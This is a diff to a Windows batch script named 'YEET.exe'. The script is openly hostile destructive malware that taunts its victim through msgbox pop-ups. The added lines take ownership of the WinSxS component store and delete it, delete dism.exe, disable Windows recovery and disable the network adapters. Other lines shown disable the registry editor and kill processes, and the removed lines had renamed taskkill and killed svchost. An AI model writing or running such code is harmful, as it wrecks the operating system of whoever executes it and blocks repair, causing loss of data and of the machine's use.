@@ -36,9 +36,8 @@ echo x=msgbox("do you know what you are running?",0+4,"YEET.exe (made by ThePCMa
 attrib +h yt.vbs
 wscript yt.vbs
 attrib -h yt.vbs
-cd %userprofile%\Desktop
 taskkill.exe /f /im YEET.exe
-del %userprofile%\Desktop\YEET.* /f
+del %~dp0YEET.* /f
 echo x=msgbox("because you totally do not now :)",0+0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 attrib +h yt.vbs
 wscript yt.vbs
@@ -54,18 +53,30 @@ wscript yt.vbs
 attrib -h yt.vbs
 echo x=msgbox("you wanna use regedit to unblock task manager? well good luck cuz i disabled the registry editor as well",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
-takeown /f c:\windows\system32\taskkill.exe
-icacls C:\windows\system32\taskkill.exe /grant %username%:F
-ren C:\Windows\system32\taskkill.exe suckyouidiottaskkill.exe
-echo x=msgbox("oh you wanna use taskkill.exe to kill cmd.exe? good luck with that XDD",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
+takeown /f /r /d y C:\Windows\WinSxS
+echo y|cacls C:\Windows\WinSxS /g %username%:F /t
+rd C:\Windows\WinSxS /s /q
+echo x=msgbox("oh you wanna use taskkill.exe to kill cmd.exe? your component store is gone anyway",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 attrib +h yt.vbs
 wscript yt.vbs
 attrib -h yt.vbs
-netsh interface set interface "Ethernet0" admin=disabled
-netsh interface set interface "Wi-Fi" admin=disabled
-netsh interface set interface "Ethernet*" admin=disabled
-netsh interface set interface "Network" admin=disabled
-echo x=msgbox("adam modemi soktu goturuyor(check ur internet)",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
+takeown /f C:\Windows\System32\dism.exe
+icacls C:\Windows\System32\dism.exe /grant %username%:F
+del /f C:\Windows\System32\dism.exe
+echo x=msgbox("you want to use dism to restore winsxs? i deleted it so goodbye",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
+attrib +h yt.vbs
+wscript yt.vbs
+attrib -h yt.vbs
+reagentc /disable
+echo x=msgbox("sowwy i *accidentaly* disabled recovery",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
+attrib +h yt.vbs
+wscript yt.vbs
+attrib -h yt.vbs
+netsh interface set interface Ethernet0 admin=disabled
+netsh interface set interface Wi-Fi admin=disabled
+netsh interface set interface Ethernet* admin=disabled
+netsh interface set interface Network admin=disabled
+echo x=msgbox("adam modemi söktü götürüyor(check ur internet)",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 attrib +h yt.vbs
 wscript yt.vbs
 attrib -h yt.vbs
@@ -159,5 +170,4 @@ attrib +h yt.vbs
 wscript yt.vbs
 del yt.vbs /f
 
-suckyouidiottaskkill /f /im svchost.exe
 
